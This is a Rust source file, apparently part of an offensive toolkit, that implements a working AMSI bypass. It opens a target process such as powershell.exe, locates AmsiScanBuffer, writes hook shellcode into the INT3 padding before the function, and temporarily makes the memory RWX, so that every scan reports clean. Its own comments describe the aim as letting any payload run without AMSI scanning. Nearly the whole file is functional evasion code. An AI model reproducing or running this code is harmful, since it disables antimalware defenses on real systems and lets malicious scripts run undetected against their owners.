//! AMSI (Antimalware Scan Interface) hooking
//!
//! Patches AmsiScanBuffer in a remote process to always return AMSI_RESULT_CLEAN,
//! effectively bypassing AMSI scanning for that process.

use crate::MiscError;
use std::ffi::CString;
use windows::core::PCSTR;
use windows::Win32::Foundation::{CloseHandle, HANDLE};
use windows::Win32::System::Diagnostics::Debug::FlushInstructionCache;
use windows::Win32::System::LibraryLoader::{GetProcAddress, LoadLibraryExA, DONT_RESOLVE_DLL_REFERENCES};
use windows::Win32::System::Memory::{VirtualProtectEx, PAGE_EXECUTE_READWRITE, PAGE_PROTECTION_FLAGS};
use windows::Win32::System::Threading::{OpenProcess, PROCESS_VM_OPERATION, PROCESS_VM_READ, PROCESS_VM_WRITE};

/// Hook AmsiScanBuffer in a remote process to bypass AMSI.
///
/// This patches the function to always return S_OK with AMSI_RESULT_CLEAN (0),
/// allowing any payload to execute without AMSI scanning.
///
/// # Arguments
/// * `pid` - Target process ID (must have amsi.dll loaded, e.g., powershell.exe)
///
/// # Returns
/// * `Ok(())` on success
/// * `Err(MiscError)` on failure
pub fn hook_amsi(pid: u32) -> Result<(), MiscError> {
    unsafe {
        // Open target process with VM permissions
        let process_handle = OpenProcess(
            PROCESS_VM_READ | PROCESS_VM_OPERATION | PROCESS_VM_WRITE,
            false,
            pid,
        )
        .map_err(|_| MiscError::OpenProcessFailed(pid))?;

        let result = hook_amsi_internal(process_handle, pid);
        let _ = CloseHandle(process_handle);
        result
    }
}

unsafe fn hook_amsi_internal(process_handle: HANDLE, _pid: u32) -> Result<(), MiscError> {
    // Load amsi.dll locally without resolving imports
    // This DLL will be loaded at the same address in the target process (ASLR)
    let dll_name = CString::new("amsi.dll").unwrap();
    let module_handle = LoadLibraryExA(
        PCSTR::from_raw(dll_name.as_ptr() as *const u8),
        None,
        DONT_RESOLVE_DLL_REFERENCES,
    )
    .map_err(|_| MiscError::AmsiHookFailed("Failed to load amsi.dll locally".to_string()))?;

    if module_handle.is_invalid() {
        return Err(MiscError::AmsiHookFailed(
            "amsi.dll not found - target process may not use AMSI".to_string(),
        ));
    }

    // Get AmsiScanBuffer address
    let func_name = CString::new("AmsiScanBuffer").unwrap();
    let amsi_scan_buffer = GetProcAddress(
        module_handle,
        PCSTR::from_raw(func_name.as_ptr() as *const u8),
    );

    let amsi_scan_buffer = match amsi_scan_buffer {
        Some(addr) => addr as *mut u8,
        None => {
            return Err(MiscError::AmsiHookFailed(
                "AmsiScanBuffer not found in amsi.dll".to_string(),
            ));
        }
    };

    // Hook shellcode that replaces AmsiScanBuffer prolog + uses code cave before it
    //
    // The shellcode does:
    //   xor eax, eax              ; EAX = 0 (S_OK)
    //   mov r11, [rsp+0x30]       ; R11 = 6th param (AMSI_RESULT* result)
    //   mov [r11], eax            ; *result = 0 (AMSI_RESULT_CLEAN)
    //   ret                       ; Return S_OK
    //   <- AmsiScanBuffer entry point is here
    //   jmp short -12             ; Jump back to our shellcode
    //
    // Total: 13 bytes (11 bytes in code cave + 2 bytes overwriting AmsiScanBuffer prolog)
    let hook_shellcode: [u8; 13] = [
        0x31, 0xC0,                         // xor eax, eax
        0x4C, 0x8B, 0x5C, 0x24, 0x30,       // mov r11, [rsp+0x30]
        0x41, 0x89, 0x03,                   // mov [r11], eax
        0xC3,                               // ret
        // <- AmsiScanBuffer entry point
        0xEB, 0xF3,                         // jmp short -13 (0xF3 = -13 in two's complement)
    ];

    const PROLOG_BYTES: usize = 2;  // Bytes to overwrite in AmsiScanBuffer
    const BACKFILL_BYTES: usize = 13 - PROLOG_BYTES;  // Bytes in code cave before function

    // Calculate write address (code cave before AmsiScanBuffer)
    let write_addr = amsi_scan_buffer.sub(BACKFILL_BYTES);

    // Read original bytes to verify code cave is available (should be 0xCC/INT3)
    let mut original_bytes: [u8; 13] = [0u8; 13];
    let mut bytes_read: usize = 0;
    let read_result = windows::Win32::System::Diagnostics::Debug::ReadProcessMemory(
        process_handle,
        write_addr as *const _,
        original_bytes.as_mut_ptr() as *mut _,
        original_bytes.len(),
        Some(&mut bytes_read),
    );

    if read_result.is_err() || bytes_read != original_bytes.len() {
        return Err(MiscError::AmsiHookFailed(
            "Failed to read original bytes from target process".to_string(),
        ));
    }

    // Verify code cave contains INT3 (0xCC) padding
    for i in 0..BACKFILL_BYTES {
        if original_bytes[i] != 0xCC {
            return Err(MiscError::AmsiHookFailed(format!(
                "Code cave not available at offset {} (expected 0xCC, found 0x{:02X})",
                i, original_bytes[i]
            )));
        }
    }

    // Change memory protection to RWX
    let mut old_protect = PAGE_PROTECTION_FLAGS(0);
    VirtualProtectEx(
        process_handle,
        write_addr as *const _,
        hook_shellcode.len(),
        PAGE_EXECUTE_READWRITE,
        &mut old_protect,
    )
    .map_err(|_| MiscError::VirtualProtectFailed)?;

    // Write hook shellcode
    let mut bytes_written: usize = 0;
    let write_result = windows::Win32::System::Diagnostics::Debug::WriteProcessMemory(
        process_handle,
        write_addr as *mut _,
        hook_shellcode.as_ptr() as *const _,
        hook_shellcode.len(),
        Some(&mut bytes_written),
    );

    // Restore original protection
    let mut temp_protect = PAGE_PROTECTION_FLAGS(0);
    let _ = VirtualProtectEx(
        process_handle,
        write_addr as *const _,
        hook_shellcode.len(),
        old_protect,
        &mut temp_protect,
    );

    if write_result.is_err() || bytes_written != hook_shellcode.len() {
        return Err(MiscError::WriteFailed);
    }

    // Flush instruction cache
    FlushInstructionCache(process_handle, Some(write_addr as *const _), hook_shellcode.len())
        .map_err(|_| MiscError::AmsiHookFailed("FlushInstructionCache failed".to_string()))?;

    Ok(())
}
